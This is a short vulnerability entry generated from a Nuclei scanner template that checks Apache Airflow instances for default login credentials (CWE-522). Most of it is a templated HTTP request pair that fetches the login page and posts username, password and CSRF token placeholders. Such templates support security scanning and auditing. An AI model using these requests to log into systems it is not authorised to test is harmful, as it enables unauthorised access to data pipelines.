# Nuclei Template: Apache Airflow Default Login
**Template ID:** airflow-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`airflow-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Airflow default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/admin/airflow/login

username={{username}}&password={{password}}&_csrf_token={{csrf_token}}
```

## References
- https://airflow.apache.org/docs/apache-airflow/stable/start/docker.html
